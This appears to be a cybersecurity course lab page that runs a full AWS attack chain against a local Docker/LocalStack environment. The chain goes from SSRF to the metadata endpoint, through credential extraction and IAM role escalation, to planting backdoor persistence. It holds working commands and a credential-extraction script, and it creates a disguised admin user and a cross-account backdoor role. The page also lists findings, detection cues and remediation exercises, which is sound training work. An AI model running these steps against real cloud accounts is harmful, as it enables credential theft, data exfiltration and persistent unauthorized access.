---
title: "Cloud Full Attack Lab — SSRF → Credentials → Escalate → Persist"
tags: [cloud-lab, AWS, SSRF, IMDS, privilege-escalation, persistence,
       full-kill-chain, Docker, lab, ATT&CK, Capital-One-pattern, S3,
       IAM, Lambda, cloud-exploitation]
module: 04-BroadSurface-02
day: 192
related_topics:
  - SSRF to AWS Metadata Lab (Day 184)
  - S3 Misconfiguration Lab (Day 185)
  - IAM Misconfiguration Attacks (Day 183)
  - Lambda and Serverless Attacks (Day 187)
  - Cloud Persistence Techniques (Day 191)
  - Detecting Cloud Attacks (Day 194)
---

# Day 192 — Cloud Full Attack Lab

> "The full kill chain is what real cloud pentests look like. Not one bug —
> a sequence. SSRF opens the door. The metadata gives you credentials. The
> credentials open the wrong door because the role is overpermissioned. You
> assume a bigger role. You plant a backdoor. You exfiltrate the data. Then
> you document everything and hand it to the team with a fix for each step.
> That is the job. Today you run the whole thing."
>
> — Ghost

---

## Goals

By the end of this lab you will have:

1. Exploited an SSRF vulnerability to extract EC2 instance role credentials
   from the metadata endpoint.
2. Used the credentials to enumerate S3 buckets and identify sensitive data.
3. Escalated privileges via an IAM misconfiguration in the instance role.
4. Assumed a more privileged role and confirmed admin-level access.
5. Planted a cross-account backdoor role as a persistence mechanism.
6. Documented each step in the format required for a professional finding report.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| SSRF to AWS Metadata Lab | Day 184 |
| S3 Misconfiguration Lab | Day 185 |
| IAM Misconfiguration Attacks | Day 183 |
| Lambda and Serverless Attacks | Day 187 |
| Cloud Persistence Techniques | Day 191 |
| Docker Compose | Days 150–151 |

---

## Lab Setup

```bash
cd learn-security/04-BroadSurface-02/samples/cloud-full-lab/
docker compose up --build -d

# Services:
# Vulnerable web app:   http://localhost:8080  (SSRF via /fetch endpoint)
# Mock IMDS:            http://localhost:9999  (simulates 169.254.169.254)
# LocalStack (AWS):     http://localhost:4566  (S3, IAM, Lambda, STS, Events)
docker compose ps

# Pre-configured environment in LocalStack:
# IAM role: ec2-webapp-role  (attached to mock EC2 instance)
#   Permissions: s3:ListAllMyBuckets, s3:GetObject on all buckets
#   PLUS: sts:AssumeRole on role escalation-target-role
# IAM role: escalation-target-role
#   Permissions: AdministratorAccess
# S3 buckets:
#   app-uploads          (application uploads)
#   app-data-backup      (production data backup with PII — the jackpot)
#   app-logs             (application logs)
# Lambda functions:
#   process-uploads      (env vars: DB_PASSWORD, JWT_SECRET)
```

---

## Phase 1 — Reconnaissance

### Step 1.1 — Probe the Application

```bash
# Identify the SSRF endpoint
curl -v http://localhost:8080/
# Look for: /fetch, /render, /preview, /download, /webhook, /redirect endpoints
curl http://localhost:8080/robots.txt
curl http://localhost:8080/sitemap.xml

# Test the fetch endpoint with an external URL
curl -s "http://localhost:8080/fetch?url=http://httpbin.org/ip"
# → {"origin": "x.x.x.x"} — server-side request confirmed
```

### Step 1.2 — Test for IMDS Access

```bash
# Probe the metadata endpoint
curl -s "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/"
# Expected: list of metadata keys

# Confirm SSRF to IMDS works
curl -s "http://localhost:8080/fetch?url=http://169.254.169.254/latest/meta-data/instance-id"
# → i-0abcdef1234567890
```

---

## Phase 2 — Credential Extraction

### Step 2.1 — Extract IAM Role Credentials

```python
# extract_creds.py
import requests, json

BASE = "http://localhost:8080/fetch?url=http://169.254.169.254"
IMDS = "/latest/meta-data"

def ssrf(path: str) -> str:
    return requests.get(f"{BASE}{IMDS}{path}").text.strip()

print("[*] Extracting metadata via SSRF...")

# Instance identity
instance_id = ssrf("/instance-id")
print(f"[+] Instance ID: {instance_id}")

# IAM role name
role_name = ssrf("/iam/security-credentials/")
print(f"[+] Attached role: {role_name}")

# Credentials
creds_raw = ssrf(f"/iam/security-credentials/{role_name}")
creds = json.loads(creds_raw)
print(f"[+] Access Key ID: {creds['AccessKeyId']}")
print(f"[+] Expiration:    {creds['Expiration']}")

# Also check user-data for hardcoded secrets
user_data = requests.get(f"{BASE}/latest/user-data").text
print(f"[+] User data:\n{user_data}")
```

```bash
python3 extract_creds.py

# Export as env vars
export AWS_ACCESS_KEY_ID="ASIAIOSFODNN7..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
export AWS_ENDPOINT_URL="http://localhost:4566"
export AWS_DEFAULT_REGION="us-east-1"
```

### Step 2.2 — Verify Identity

```bash
aws sts get-caller-identity
# → arn:aws:sts::123456789012:assumed-role/ec2-webapp-role/i-0abcdef1234567890
```

---

## Phase 3 — Service Enumeration

### Step 3.1 — S3 Enumeration

```bash
# List all S3 buckets the role can see
aws s3 ls
# → 2024-01-01 app-uploads
# → 2024-01-01 app-data-backup
# → 2024-01-01 app-logs

# List contents of each bucket
for bucket in $(aws s3 ls | awk '{print $3}'); do
  echo "=== $bucket ==="
  aws s3 ls s3://$bucket/ --recursive
done

# Download the most sensitive file
aws s3 cp s3://app-data-backup/customer-data-2024-01.csv .
head -5 customer-data-2024-01.csv
# → id,email,name,address,credit_card_last4,ssn_last4
```

### Step 3.2 — Lambda Enumeration

```bash
# List Lambda functions
aws lambda list-functions | jq '.Functions[].FunctionName'

# Get environment variables from the process-uploads function
aws lambda get-function-configuration \
  --function-name process-uploads \
  | jq '.Environment.Variables'
# → {"DB_PASSWORD": "Pr0d-DB-P@ss!99", "JWT_SECRET": "jwt-secret-key-prod"}
```

### Step 3.3 — IAM Enumeration

```bash
# What can this role do?
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::123456789012:assumed-role/ec2-webapp-role/session \
  --action-names "sts:AssumeRole" "iam:CreateUser" "iam:AttachUserPolicy" \
  | jq '.EvaluationResults[] | {Action: .EvalActionName, Decision: .EvalDecision}'

# What roles can we assume?
aws iam list-roles | jq '.Roles[] | {Name: .RoleName, Arn: .Arn}'
```

---

## Phase 4 — Privilege Escalation

### Step 4.1 — Assume the Escalation Target Role

```bash
# Attempt to assume escalation-target-role
ESCALATED=$(aws sts assume-role \
  --role-arn arn:aws:iam::123456789012:role/escalation-target-role \
  --role-session-name escalated-session)

echo "[+] Escalation succeeded!"
echo $ESCALATED | jq '.Credentials | {Key: .AccessKeyId, Expires: .Expiration}'

# Update credentials
export AWS_ACCESS_KEY_ID=$(echo $ESCALATED | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $ESCALATED | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $ESCALATED | jq -r '.Credentials.SessionToken')

# Confirm admin identity
aws sts get-caller-identity
# → arn:aws:sts::123456789012:assumed-role/escalation-target-role/escalated-session

# Confirm admin access
aws iam list-users
# → Lists all IAM users (admin permission confirmed)
```

---

## Phase 5 — Persistence

### Step 5.1 — Create a Backdoor IAM User

```bash
# Create a stealthy backdoor user
aws iam create-user --user-name monitoring-health-svc
aws iam attach-user-policy \
  --user-name monitoring-health-svc \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
BACKDOOR_KEY=$(aws iam create-access-key --user-name monitoring-health-svc)

echo "[+] Backdoor credentials:"
echo $BACKDOOR_KEY | jq '.AccessKey | {KeyId: .AccessKeyId, Secret: .SecretAccessKey}'
```

### Step 5.2 — Plant a Cross-Account Backdoor Role

```bash
# Create a role that your external attacker account can assume
cat > /tmp/backdoor-trust.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {
      "AWS": "arn:aws:iam::999999999999:root"
    },
    "Action": "sts:AssumeRole",
    "Condition": {
      "StringEquals": {
        "sts:ExternalId": "c2-reentry-token-abc123"
      }
    }
  }]
}
EOF

aws iam create-role \
  --role-name CloudHealthSyncRole \
  --assume-role-policy-document file:///tmp/backdoor-trust.json \
  --description "Cloud health synchronisation service"

aws iam attach-role-policy \
  --role-name CloudHealthSyncRole \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

echo "[+] Cross-account backdoor role planted:"
echo "    Role: CloudHealthSyncRole"
echo "    Trust: account 999999999999 with externalId c2-reentry-token-abc123"
```

---

## Phase 6 — Documentation

### Findings Summary

```
Finding 1 — SSRF to Instance Metadata (Critical, CVSS 9.1)
  SSRF at GET /fetch allows server-side requests to 169.254.169.254.
  Extracted: instance role temporary credentials (valid 6 hours).

Finding 2 — Over-Privileged IAM Role — sts:AssumeRole on Admin Role (High, CVSS 8.1)
  ec2-webapp-role has sts:AssumeRole permission on escalation-target-role
  (which has AdministratorAccess). Escalation: web app SSRF → admin-level access.

Finding 3 — Lambda Env Var Secrets Exposure (High, CVSS 7.5)
  process-uploads function exposes DB_PASSWORD and JWT_SECRET in plaintext
  environment variables, accessible to any principal with
  lambda:GetFunctionConfiguration.

Finding 4 — S3 Backup Bucket Contains Customer PII (Critical, CVSS 9.1)
  app-data-backup bucket is accessible to ec2-webapp-role and contains
  customer CSV with email, SSN last 4, and card last 4 for ~1M records.

Attack Chain (Critical, CVSS 9.9):
  SSRF → IMDS creds → sts:AssumeRole → admin access → exfiltrate 1M records
  → plant backdoor user + cross-account role → persistent admin access.
```

---

## Capture the Flags

```bash
# Flag 1: Read from the S3 backup bucket
aws s3 cp s3://app-data-backup/flag.txt -
# → FLAG{ssrf_to_imds_credential_theft}

# Flag 2: Read the Lambda env var
aws lambda get-function-configuration \
  --function-name process-uploads | jq -r '.Environment.Variables.FLAG'
# → FLAG{lambda_env_var_exposure}

# Flag 3: Confirm admin access after escalation
aws iam list-users | jq -r '.Users[] | select(.UserName=="admin") | .Tags[] | select(.Key=="Flag") | .Value'
# → FLAG{iam_role_chain_escalation}
```

---

## Key Takeaways

1. **The full AWS kill chain runs in under 15 minutes with the right tools.**
   SSRF → IMDS → assume role → admin. The bottleneck is finding the SSRF, not
   executing the chain. Know the chain cold so execution is automatic.
2. **Every privilege escalation step leaves a CloudTrail event.** `AssumeRole`
   with an unexpected session name; `CreateUser` outside of IAM admin hours;
   `CreateAccessKey` for a non-CI/CD user. Log analysis and alerting on these
   patterns closes the detection gap.
3. **Data in S3 buckets accessible to EC2 roles is effectively accessible to
   anyone who can SSRF the EC2 instance.** The role's S3 scope should be
   limited to the minimum prefix the application actually needs.
4. **Persistence artefacts (backdoor users, cross-account roles) are removable
   — but only if the IR team knows what to look for.** The IR checklist must
   include full IAM audit, not just credential rotation.
5. **Documenting the chain end-to-end is the difference between a report that
   gets fixed and one that gets triaged to low priority.** Show the full path
   from unauthenticated SSRF to admin access with evidence at each step.

---

## Exercises

1. Reset the lab and time yourself running the full kill chain from Phase 1
   through Phase 5. Target: under 20 minutes. Document where you slowed down.
2. Write the combined CVSS score for the full attack chain as a single finding.
   Justify each metric (AV, AC, PR, UI, S, C, I, A).
3. Implement one defensive control for each phase: (1) block SSRF at the
   application layer, (2) enforce IMDSv2, (3) restrict the IAM role, (4)
   move secrets to Secrets Manager, (5) alert on IAM user creation in
   CloudTrail.
4. Write the complete finding report for the attack chain using the Day 161
   template. Include a PoC script (the `extract_creds.py` from Phase 2) and
   a detailed remediation section covering all four finding components.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q192.1, Q192.2 …).
> Follow-up questions use hierarchical numbering (Q192.1.1, Q192.1.2 …).

---

## Navigation

← Previous: [Day 191 — Cloud Persistence Techniques](DAY-0191-Cloud-Persistence-Techniques.md)
→ Next: [Day 193 — Cloud Bug Bounty Strategy](DAY-0193-Cloud-Bug-Bounty-Strategy.md)
